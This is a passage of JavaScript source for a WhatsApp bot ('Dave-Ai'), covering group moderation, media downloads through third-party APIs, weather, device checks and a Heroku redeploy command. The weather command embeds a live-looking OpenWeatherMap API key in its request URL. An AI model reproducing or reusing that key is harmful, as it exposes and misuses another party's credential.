        await new Promise(res => setTimeout(res, 10000));

        let removedCount = 0;
        for (const bot of suspectedBots) {
            try {
                await dave.groupParticipantsUpdate(from, [bot.id], 'remove');
                removedCount++;
            } catch (err) {
                console.error(`Failed to remove ${bot.id}:`, err.message);
            }
        }

        m.reply(`Removed ${removedCount} suspected bot(s) from the group!`);
    } catch (err) {
        console.error("antibot error:", err);
        m.reply("Failed to scan/remove bots. Make sure I'm an admin!");
    }
}
break;

case 'sc':
case 'git':
case 'deployme':
case 'rep':
case 'DaveAi': {
    const axios = require('axios');
    const owner = "gifteddevsmd";
    const repo = "Dave-Ai";
    const apiUrl = `https://api.github.com/repos/${owner}/${repo}`;
    const collabUrl = `https://api.github.com/repos/${owner}/${repo}/collaborators`;

    await reply("Fetching repository details...");

    try {
        const repoRes = await axios.get(apiUrl, { headers: { "User-Agent": "DaveAi" } });
        const data = repoRes.data;

        let collabCount = 0;
        try {
            const collabRes = await axios.get(collabUrl, { headers: { "User-Agent": "DaveAi" } });
            collabCount = collabRes.data.length;
        } catch {
            collabCount = "Private/Hidden";
        }

        const msg = `
𝘿𝙖𝙫𝙚𝘼𝙄 REPO

Repository: ${data.html_url}

Stars: ${data.stargazers_count}
Forks: ${data.forks_count}

Collaborators: ${collabCount}

Last Updated: ${new Date(data.updated_at).toLocaleString()}

Owner: ${data.owner.login}

Language: ${data.language || "Kijaluo"}

Description: "_𝘿𝙖𝙫𝙚𝘼𝙄 by Dave_"
`;

        await reply(msg);
    } catch (err) {
        console.error(err);
        await reply("Failed to fetch repository info. Please try again later.");
    }
}
break
//==================================================//  

case 'whois': {
  try {
    if (!m.quoted && args.length === 0) 
      return reply("Provide a user number (e.g., 2547xxxxxxx) to get info.");

    const jid = m.quoted ? m.quoted.sender : `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;

    let ppUrl;
    try {
      ppUrl = await dave.profilePictureUrl(jid);
    } catch {
      ppUrl = 'https://i.ibb.co/0jqHpnp/No-Profile-Pic.png';
    }

    let about = 'Not set';
    try {
      const status = await dave.status(jid);
      about = status.status || about;
    } catch {}

    const number = jid.split('@')[0];

    await dave.sendMessage(from, {
      image: { url: ppUrl },
      caption: `Whois Info:\n\nNumber: +${number}\nAbout: ${about}`
    }, { quoted: m });

  } catch (err) {
    console.error('whois command error:', err);
    await reply('Failed to fetch user info.');
  }
}
break

case 'welcomemessage':
case 'connectmessage': 
case 'inboxmessage': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example: ${prefix + command} on/off`)
    
    const settings = global.settings
    
    if (q === 'on') {
        if (settings.showConnectMsg) return reply('Connection message is already enabled')
        
        settings.showConnectMsg = true
        global.saveSettings(settings)
        global.settings = settings
        reply('Connection message enabled')
    } 
    else if (q === 'off') {
        if (!settings.showConnectMsg) return reply('Connection message is already disabled')
        
        settings.showConnectMsg = false
        global.saveSettings(settings)
        global.settings = settings
        reply('Connection message disabled')
    } 
    else {
        const status = settings.showConnectMsg ? 'enabled' : 'disabled'
        reply(`Connection message is currently ${status}. Use: ${prefix}connectmessage on/off`)
    }
}
break

case 'checkphone': {
    try {
        let target;
        if (m.message.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
            target = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
        } else if (m.quoted && m.quoted.sender) {
            target = m.quoted.sender;
        } else {
            target = m.sender;
        }

        const [userData] = await dave.onWhatsApp(target);
        if (!userData) return reply("User not found on WhatsApp.");

        let deviceType = "Unknown";
        if (m.key.id.startsWith("3EB0")) deviceType = "Android";
        else if (m.key.id.startsWith("3AEB")) deviceType = "iPhone";
        else if (m.key.id.startsWith("BAE5")) deviceType = "Web";
        else if (m.key.id.startsWith("7EBA")) deviceType = "KaiOS";

        const ua = (dave.user?.platform || "WhatsApp MD").toLowerCase();
        let phoneBrand = "Unknown";

        if (/samsung|sm-|galaxy/.test(ua)) phoneBrand = "Samsung";
        else if (/tecno/.test(ua)) phoneBrand = "Tecno";
        else if (/infinix/.test(ua)) phoneBrand = "Infinix";
        else if (/itel/.test(ua)) phoneBrand = "Itel";
        else if (/nokia/.test(ua)) phoneBrand = "Nokia";
        else if (/iphone|ios/.test(ua)) phoneBrand = "Apple iPhone";
        else if (/xiaomi|redmi/.test(ua)) phoneBrand = "Xiaomi";
        else if (/huawei/.test(ua)) phoneBrand = "Huawei";
        else if (/oppo/.test(ua)) phoneBrand = "Oppo";
        else if (/vivo/.test(ua)) phoneBrand = "Vivo";
        else if (/desktop|mac/.test(ua)) phoneBrand = "Desktop/PC";

        const result = `
Device Check

User: @${target.split('@')[0]}
Device Type: ${deviceType}
Brand / Model: ${phoneBrand}
Platform: ${dave.user?.platform || "WhatsApp Multi-Device"}
WhatsApp Version: ${dave.user?.waVersion?.join('.') || "Unknown"}
        `.trim();

        await dave.sendMessage(from, { text: result, mentions: [target] }, { quoted: m });
    } catch (err) {
        console.error("checkphone error:", err);
        reply("Failed to fetch device information.");
    }
}
break

case 'uptime':
case 'runtime': {
  const uptime = process.uptime();
  const days = Math.floor(uptime / (24 * 3600));
  const hours = Math.floor((uptime % (24 * 3600)) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  dave.sendMessage(m.chat, { text: `𝘿𝙖𝙫𝙚𝘼𝙄 Runtime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
}
break

case 'setdp': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const fs = require('fs');
    const path = require('path');
    const tmp = require('os').tmpdir();

    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMsg || !quotedMsg.imageMessage) {
      return reply("Reply to an image to set it as bot profile picture!");
    }

    reply("Updating profile picture...");

    const stream = await downloadContentFromMessage(quotedMsg.imageMessage, 'image');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const tempFile = path.join(tmp, `dp_${Date.now()}.jpg`);
    fs.writeFileSync(tempFile, buffer);

    await dave.updateProfilePicture(dave.user.id, { url: tempFile });

    fs.unlinkSync(tempFile);

    reply("Bot profile picture updated!");
  } catch (err) {
    console.error("setdp error:", err);
    reply("Failed to update bot profile picture.");
  }
}
break

case 'claude-al': {
  try {
    const question = args.join(' ');
    if (!question) return reply('Please provide a question. Usage: .claude-al <your question>');

    await reply('Asking Claude, please wait...');

    const fetch = require('node-fetch');
    const apiUrl = `https://savant-api.vercel.app/ai/claude?question=${encodeURIComponent(question)}`;

    const res = await fetch(apiUrl);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    let data;
    try {
      data = await res.json();
    } catch {
      const text = await res.text();
      data = { answer: text };
    }

    console.log('Claude API response:', data);

    const answer =
      data.answer ||
      data.response ||
      data.result ||
      data.output ||
      data.text ||
      "No valid response received from API.";

    await reply(`Claude AI Response:\n\n${answer}`);
  } catch (err) {
    console.error('Claude Command Error:', err);
    await reply(`Failed to fetch response from Claude API.\nError: ${err.message}`);
  }
}
break

case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'tupai': {
    try {
        if (!m.quoted || !m.quoted.message) return reply(`Reply to an audio you want to convert with the caption ${prefix + command}`);
        
        const quotedMsg = m.quoted.message;
        const isAudio = quotedMsg.audioMessage || 
                       quotedMsg.pttMessage || 
                       (quotedMsg.extendedTextMessage && quotedMsg.extendedTextMessage.contextInfo && 
                        (quotedMsg.extendedTextMessage.contextInfo.quotedMessage.audioMessage || 
                         quotedMsg.extendedTextMessage.contextInfo.quotedMessage.pttMessage));
        
        if (!isAudio) return reply('Reply to an audio file!');

        dave.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } }).catch(() => {});

        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        if (/earrape/.test(command)) set = '-af volume=12';
        if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';

        (async () => {
            const mediaPath = await dave.downloadAndSaveMediaMessage(m.quoted);
            const outputPath = getRandom('.mp3');

            exec(`ffmpeg -i "${mediaPath}" ${set} "${outputPath}"`, (err) => {
                fs.unlinkSync(mediaPath);

                if (err) return reply('Error processing audio: ' + err.message);

                const buffer = fs.readFileSync(outputPath);
                dave.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg' }, { quoted: m })
                    .catch(() => {})
                    .finally(() => fs.unlinkSync(outputPath));
            });
        })();

    } catch (error) {
        console.error('Audio effect error:', error);
        reply('Something went wrong while processing the audio.');
    }
}
break

case 'checktime':
case 'time': {
    try {
        if (!text) return reply("Please provide a city or country name to check the local time.");
        await reply(`Checking local time for ${text}...`);
        const tzRes = await fetch(`https://worldtimeapi.org/api/timezone`);
        const timezones = await tzRes.json();
        const match = timezones.find(tz => tz.toLowerCase().includes(text.toLowerCase()));
        if (!match) return reply(`Could not find timezone for ${text}.`);
        const res = await fetch(`https://worldtimeapi.org/api/timezone/${match}`);
        const data = await res.json();
        const datetime = new Date(data.datetime);
        const hours = datetime.getHours();
        const greeting = hours < 12 ? "Good Morning" : hours < 18 ? "Good Afternoon" : "Good Evening";
        const timeText = `
Local Time in ${text}
${greeting}
Timezone: ${data.timezone}
Time: ${datetime.toLocaleTimeString()}
Date: ${datetime.toDateString()}
Uptime: ${formatUptime(process.uptime())}`;
        await reply(timeText);
    } catch (e) {
        console.error("checktime error:", e);
        reply("Unable to fetch time for that city.");
    }
}
break

case 'ssweb': {
  try {
    const url = args[0];
    if (!url) return reply('Please provide a valid URL.\nExample: .ssweb https://example.com');

    await reply('Capturing screenshot, please wait...');

    const fetch = require('node-fetch');
    const apiUrl = `https://api.zenzxz.my.id/api/tools/ssweb?url=${encodeURIComponent(url)}`;

    const res = await fetch(apiUrl);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);
    const buffer = await res.buffer();

    await dave.sendMessage(from, {
      image: buffer,
      caption: `Screenshot of: ${url}`,
    }, { quoted: m });

  } catch (err) {
    console.error('ssweb Command Error:', err);
    await reply(`Failed to capture screenshot.\nError: ${err.message}`);
  }
}
break
   
        case "updateheroku": case "redeploy": {
                      const axios = require('axios');

                if(!daveshown) return reply(mess.owner);
                     if (!appname || !herokuapi) {
            await reply("It looks like the Heroku app name or API key is not set. Please make sure you have set the `APP_NAME` and `HEROKU_API` environment variables.");
            return;
        }

        async function redeployApp() {
            try {
                const response = await axios.post(
                    `https://api.heroku.com/apps/${appname}/builds`,
                    {
                        source_blob: {
                            url: "https://github.com/gifteddevsmd/Dave-Ai/tarball/main",
                        },
                    },
                    {
                        headers: {
                            Authorization: `Bearer ${herokuapi}`,
                            Accept: "application/vnd.heroku+json; version=3",
                        },
                    }
                );

                await m.reply("Your bot is undergoing an upgrade, hold  for the next 2 minutes as the redeploy executes! Once done, you’ll have the freshest version of *Dave-Ai* .");
                console.log("Build details:", response.data);
            } catch (error) {
                const errorMessage = error.response?.data || error.message;
                await reply(`Failed to update and redeploy. Please check if you have set the Heroku API key and Heroku app name correctly.`);
                console.error("Error triggering redeploy:", errorMessage);
            }
        }

        redeployApp();
    }
        break;

                        

        case 'video': {
  try {
    if (!text) return reply('What video do you want to download?');

    let videoUrl = '';
    let videoTitle = '';
    let videoThumbnail = '';

    if (text.startsWith('http://') || text.startsWith('https://')) {
      videoUrl = text;
    } else {
      const { videos } = await yts(text);
      if (!videos || videos.length === 0) return reply('No videos found!');
      videoUrl = videos[0].url;
      videoTitle = videos[0].title;
      videoThumbnail = videos[0].thumbnail;
    }

    const izumi = {
      baseURL: "https://izumiiiiiiii.dpdns.org"
    };

    const AXIOS_DEFAULTS = {
      timeout: 60000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*'
      }
    };

    const tryRequest = async (getter, attempts = 3) => {
      let lastError;
      for (let attempt = 1; attempt <= attempts; attempt++) {
        try {
          return await getter();
        } catch (err) {
          lastError = err;
          if (attempt < attempts) {
            await new Promise(r => setTimeout(r, 1000 * attempt));
          }
        }
      }
      throw lastError;
    };

    const getIzumiVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `${izumi.baseURL}/downloader/youtube?url=${encodeURIComponent(youtubeUrl)}&format=720`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.download) return res.data.result;
      throw new Error('Izumi video API returned no download');
    };

    const getOkatsuVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.mp4) {
        return {
          download: res.data.result.mp4,
          title: res.data.result.title
        };
      }
      throw new Error('Okatsu API returned no mp4');
    };

    // Send thumbnail
    try {
      const ytId = (videoUrl.match(/(?:youtu\.be\/|v=)([a-zA-Z0-9_-]{11})/) || [])[1];
      const thumb = videoThumbnail || (ytId ? `https://i.ytimg.com/vi/${ytId}/sddefault.jpg` : undefined);
      const captionTitle = videoTitle || text;

      if (thumb) {
        await dave.sendMessage(m.chat, {
          image: { url: thumb },
          caption: `*${captionTitle}*\n> _🏂searching video data..._`,
        }, { quoted: m });
      }
    } catch (e) {
      console.error('[VIDEO] Thumbnail Error:', e?.message || e);
    }

    // Validate YouTube URL
    const urls = videoUrl.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
    if (!urls) return reply('This is not a valid YouTube link!');

    // Try downloading video
    let videoData;
    try {
      videoData = await getIzumiVideoByUrl(videoUrl);
    } catch (e1) {
      console.warn('[VIDEO] Izumi failed, trying Okatsu:', e1?.message || e1);
      videoData = await getOkatsuVideoByUrl(videoUrl);
    }

    await dave.sendMessage(m.chat, {
      video: { url: videoData.download },
      mimetype: 'video/mp4',
      fileName: `${videoData.title || videoTitle || 'video'}.mp4`,
      caption: `*${videoData.title || videoTitle || 'Video'}*`,
    }, { quoted: m });

  } catch (error) {
    console.error('[VIDEO] Command Error:', error?.message || error);
    reply('Download failed: ' + (error?.message || 'Unknown error'));
  }
  break;
}
//==================================================//        
   case 'weather': {
                      try {

if (!text) return reply("provide a city/town name");

const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

} catch (e) { reply("Unable to find that location.") }
  }
   break;
//==================================================//        
  case 'gitclone': {
                      if (!text) return m.reply(`Where is the link?`)
if (!text.includes('github.com')) return reply(`Is that a GitHub repo link ?!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user3, repo] = text.match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    await dave.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))

                    }
                      break; //==================================================//     
        

//==================================================//           
      
  case 'ping': {
  const start = Date.now();
  const sentMsg = await m.reply('Pinging...');
  const latency = Date.now() - start;

  // Edit the same message
  await dave.sendMessage(
    m.chat,
    { text: `Pong! Latency: ${latency}ms` },
    { edit: sentMsg.key } // only works on supported Baileys version
  );
}
break;    
      
      //==================================================//      
    case 'yts': case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} faded`)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `❤️ No : ${no++}\n❤️Type : ${i.type}\n ❤️Video ID : ${i.videoId}\n❤️ Title : ${i.title}\n❤️ Views : ${i.views}\n❤️ Duration : ${i.timestamp}\n❤️ Uploaded : ${i.ago}\n❤️ Url : ${i.url}\n\n─────────────────\n\n`
                }
                dave.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break  

        case 'shorturl': {
const zlib = require('zlib');
const qs = require('querystring');      
const kualatshort = async (url) => {
  const res = await axios.post(
    'https://kua.lat/shorten',
    qs.stringify({ url }),
    {
      responseType: 'arraybuffer',
      headers: {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://kua.lat',
        'Referer': 'https://kua.lat/',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
      }
    }
  )

  let decoded
  const encoding = res.headers['content-encoding']

  if (encoding === 'br') {
    decoded = zlib.brotliDecompressSync(res.data)
  } else if (encoding === 'gzip') {
    decoded = zlib.gunzipSync(res.data)
  } else if (encoding === 'deflate') {
    decoded = zlib.inflateSync(res.data)
  } else {
    decoded = res.data
  }

  return JSON.parse(decoded.toString())
}

    try {
      if (!text) return m.reply('Use : .shorturl https://example.com')

      const result = await kualatshort(text)

      if (!result?.data?.shorturl) {
        return m.reply('failed to create url.')
      }

      reply(`🔗 *Short URL:*\n${result.data.shorturl}`)
    } catch (e) {
      console.error('[SHORTURL] Error:', e)
      reply(`Error: ${e.message}`)
    }
    break
  }

//==================================================//  

case 'anticallwhitelist':
case 'allowedcallers': {
    if (!daveshown) return reply(mess.owner);

    const ANTICALL_PATH = './library/database/anticall.json';

    try {
        // Initialize or load existing data
        let data = { enabled: false, whitelist: [] };
        if (fs.existsSync(ANTICALL_PATH)) {
            const fileContent = fs.readFileSync(ANTICALL_PATH, 'utf8');
            data = JSON.parse(fileContent || '{}');
        }
        if (!data.whitelist) data.whitelist = [];

        // Check if user is mentioned or quoted
        let targetUser;
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetUser = m.mentionedJid[0];
        } else if (m.quoted) {
            targetUser = m.quoted.sender;
        } else {
            return reply('Please mention a user or reply to their message\nExample: .anticallwhitelist @user');
        }

        const username = targetUser.split('@')[0];

        // Toggle user in whitelist
        if (data.whitelist.includes(targetUser)) {
            // Remove from whitelist
            data.whitelist = data.whitelist.filter(u => u !== targetUser);
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify(data, null, 2));
            reply(`❌ Removed @${username} from call whitelist\nThey will now be blocked if they call.`);
        } else {
            // Add to whitelist
            data.whitelist.push(targetUser);
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify(data, null, 2));
            reply(`✅ Added @${username} to call whitelist\nThey can now call without being blocked.`);
        }

    } catch (err) {
        console.error('Whitelist error:', err);
        reply('❌ Error managing call whitelist');
    }
}
break;

case 'callwhitelist':
case 'showallowed': {
    if (!daveshown) return reply(mess.owner);

    const ANTICALL_PATH = './library/database/anticall.json';

    try {
        let data = { enabled: false, whitelist: [] };
        if (fs.existsSync(ANTICALL_PATH)) {
            const fileContent = fs.readFileSync(ANTICALL_PATH, 'utf8');
            data = JSON.parse(fileContent || '{}');
        }
        if (!data.whitelist) data.whitelist = [];

        if (data.whitelist.length === 0) {
            reply('📝 Call whitelist is empty\nNo users are allowed to call.');
        } else {
            const userList = data.whitelist.map(u => `• @${u.split('@')[0]}`).join('\n');
            reply(`📝 Call Whitelist (${data.whitelist.length} users):\n\n${userList}`);
        }

    } catch (err) {
        console.error('Whitelist view error:', err);
        reply('❌ Error reading call whitelist');
    }
}
break;


             
//==================================================// 
case 'goodbye': {
  if (!m.isGroup) return reply(mess.OnlyGrup)
  if (!isAdmins) return reply(mess.admin)

  // Load current settings
  const settings = loadSettings()

  if (args[0] === "on") {
    if (settings.goodbye === true)
      return reply('Goodbye feature is already activated.')

    settings.goodbye = true
    saveSettings(settings)
    global.settings = settings
    reply('Successfully activated goodbye messages.')
  } 
  else if (args[0] === "off") {
    if (settings.goodbye === false)
      return reply('Goodbye feature is already deactivated.')

    settings.goodbye = false
    saveSettings(settings)
    global.settings = settings
    reply('Successfully deactivated goodbye messages.')
  } 
  else {
    const status = settings.goodbye ? 'activated' : 'deactivated'
    reply(
      `Goodbye feature is currently *${status}*.\nUse:\n• ${prefix}goodbye on – activate\n• ${prefix}goodbye off – deactivate`
    )
  }
}
break

// ============Converter
  
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10': {
    try {
        const link = `https://raw.githubusercontent.com/Leoo7z/Music/main/${command}.mp3`;
        await dave.sendMessage(m.chat, {
            audio: { url: link },
            mimetype: 'audio/mpeg'
        }, { quoted: m });
    } catch (err) {
        reply(`❌ An error occurred: ${err.message || err}`);
    }
}
break;         

                        //============ Sound
    

// === PASTEBIN FETCH ===
case 'getpastebin': case 'getpb': {
    if (!text) return reply(`🔗 Example:\n.getpb https://pastebin.com/raw/abc123`);
    try {
        const res = await fetch(`https://api.nekorinn.my.id/tools/getpastebin?url=${encodeURIComponent(text)}`);
        const json = await res.json();
        if (!json.status) return reply('⚠️ Failed to fetch data from Pastebin.');

        const content = json.result.content
            .split('\n')
            .filter(line => !line.trim().startsWith('//'))
            .join('\n');

        const preview = content.length > 4000 ? content.slice(0, 4000) + '\n\n📌 (Auto-truncated)' : content;

        await reply(`📄 Pastebin Content:\n\n${preview}`);
    } catch (err) {
        reply(`❌ Error fetching Pastebin content: ${err.message}`);
    }
}
break;

case 'antitag': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)
    if (!daveshown) return reply(mess.owner)
    
    const settings = global.settings
    settings.antitag = settings.antitag || {}
    
    const option = args[0]?.toLowerCase()
    const mode = args[1]?.toLowerCase() || "delete"

    if (option === "on") {
        settings.antitag[m.chat] = { enabled: true, mode }
        global.saveSettings(settings)
        global.settings = settings
        reply(`Antitag enabled. Mode: ${mode}. Messages with tags will be ${mode === "kick" ? "deleted and user kicked" : "deleted"}`)
    } 
    else if (option === "off") {
        if (settings.antitag[m.chat]) {
            delete settings.antitag[m.chat]
            global.saveSettings(settings)
            global.settings = settings
        }
        reply("Antitag disabled for this group")
    } 
    else {
        const current = settings.antitag[m.chat]
        reply(`Antitag Settings for This Group\nStatus: ${current?.enabled ? "ON" : "OFF"}\nMode: ${current?.mode?.toUpperCase() || "DELETE"}\n\nUsage: ${prefix}antitag on [delete/kick] or ${prefix}antitag off`)
    }
}
break

case 'antidemote': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)
    if (!daveshown) return reply(mess.owner)

    const settings = global.settings
    settings.antidemote = settings.antidemote || {}

    const option = args[0]?.toLowerCase()
    const mode = args[1]?.toLowerCase() || "revert"

    if (option === "on") {
        settings.antidemote[m.chat] = { enabled: true, mode }
        global.saveSettings(settings)
        global.settings = settings
        reply(`Antidemote enabled. Mode: ${mode}`)
    } 
    else if (option === "off") {
        delete settings.antidemote[m.chat]
        global.saveSettings(settings)
        global.settings = settings
        reply("Antidemote disabled")
    } 
    else {
        const current = settings.antidemote[m.chat]?.enabled ? `ON (${settings.antidemote[m.chat].mode})` : "OFF"
        reply(`Antidemote Settings\nStatus: ${current}\n\nUsage: ${prefix}antidemote on revert or ${prefix}antidemote on kick or ${prefix}antidemote off`)
    }
}
break

case 'antipromote': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)
    if (!daveshown) return reply(mess.owner)

    const settings = global.settings
    settings.antipromote = settings.antipromote || {}

    const option = args[0]?.toLowerCase()
    const mode = args[1]?.toLowerCase() || "revert"

    if (option === "on") {
        settings.antipromote[m.chat] = { enabled: true, mode }
        global.saveSettings(settings)
        global.settings = settings
        reply(`Antipromote enabled. Mode: ${mode}`)
    } 
    else if (option === "off") {
        delete settings.antipromote[m.chat]
        global.saveSettings(settings)
        global.settings = settings
        reply("Antipromote disabled")
    } 
    else {
        const current = settings.antipromote[m.chat]?.enabled ? `ON (${settings.antipromote[m.chat].mode})` : "OFF"
        reply(`Antipromote Settings\nStatus: ${current}\n\nUsage: ${prefix}antipromote on revert or ${prefix}antipromote on kick or ${prefix}antipromote off`)
    }
}
break

case 'antibadword': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)
    if (!daveshown) return reply(mess.owner)

    const settings = global.settings
    settings.antibadword = settings.antibadword || {}

    const option = args[0]?.toLowerCase()

    if (option === "on") {
        settings.antibadword[m.chat] = {
            enabled: true,
            words: settings.antibadword[m.chat]?.words || [],
            warnings: {}
        }
        global.saveSettings(settings)
        global.settings = settings
        reply("Antibadword enabled for this group")
    } 
    else if (option === "off") {
        delete settings.antibadword[m.chat]
        global.saveSettings(settings)
        global.settings = settings
        reply("Antibadword disabled for this group")
    } 
    else if (option === "add") {
        const word = args.slice(1).join(" ").toLowerCase()
        if (!word) return reply(`Usage: ${prefix}antibadword add <word>`)
        settings.antibadword[m.chat] = settings.antibadword[m.chat] || { enabled: true, words: [], warnings: {} }
        settings.antibadword[m.chat].words.push(word)
        global.saveSettings(settings)
        global.settings = settings
        reply(`Added bad word: ${word}`)
    } 
    else if (option === "remove") {
        const word = args.slice(1).join(" ").toLowerCase()
        if (!word) return reply(`Usage: ${prefix}antibadword remove <word>`)
        if (!settings.antibadword[m.chat]?.words?.includes(word)) return reply("Word not found in list")
        settings.antibadword[m.chat].words = settings.antibadword[m.chat].words.filter(w => w !== word)
        global.saveSettings(settings)
        global.settings = settings
        reply(`Removed bad word: ${word}`)
    } 
    else if (option === "list") {
        const list = settings.antibadword[m.chat]?.words || []
        if (list.length === 0) return reply("No bad words added yet")
        reply(`Bad Words List:\n${list.map((w, i) => `${i + 1}. ${w}`).join("\n")}`)
    } 
    else {
        const status = settings.antibadword[m.chat]?.enabled ? "ON" : "OFF"
        const wordCount = settings.antibadword[m.chat]?.words?.length || 0
        reply(`Antibadword Settings\nStatus: ${status}\nWords: ${wordCount}\n\nUsage: ${prefix}antibadword on/off/add/remove/list`)
    }
}
break

case 'add': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply(mess.admin)

    if (!text && !m.quoted) {
        return reply(`Example: ${prefix}add 2547xxxxxxx`)
    }

    const numbersOnly = text
        ? text.replace(/\D/g, '') + '@s.whatsapp.net'
        : m.quoted?.sender

    try {
        const res = await dave.groupParticipantsUpdate(from, [numbersOnly], 'add')
        for (let i of res) {
            const invv = await dave.groupInviteCode(from)

            if (i.status == 408) return reply("User is already in the group")
            if (i.status == 401) return reply("Bot is blocked by the user")
            if (i.status == 409) return reply("User recently left the group")
            if (i.status == 500) return reply("Invalid request. Try again later")

            if (i.status == 403) {
                await dave.sendMessage(
                    from,
                    {
                        text: `@${numbersOnly.split('@')[0]} cannot be added because their account is private. An invite link will be sent to their private chat.`,
                        mentions: [numbersOnly],
                    },
                    { quoted: m }
                )

                await dave.sendMessage(
                    numbersOnly,
                    {
                        text: `Group Invite: https://chat.whatsapp.com/${invv}\nAdmin: wa.me/${m.sender.split('@')[0]}\nYou have been invited to join this group.`,
                        detectLink: true,
                        mentions: [numbersOnly],
                    },
                    { quoted: m }
                ).catch((err) => reply('Failed to send invitation'))
            } else {
                reply(mess.success)
            }
        }
    } catch (e) {
        console.error(e)
        reply('Could not add user')
    }
}
break


// === SNACKVIDEO DOWNLOADER ===
case 'snackvideo': case 'sv': {
    if (!text) return reply(`❌ Example: ${prefix + command} https://snackvideo.com/somevideo`);
    try {
        const res = await fetch(`https://api.siputzx.my.id/api/d/snackvideo?url=${text}`);
        const data = await res.json();
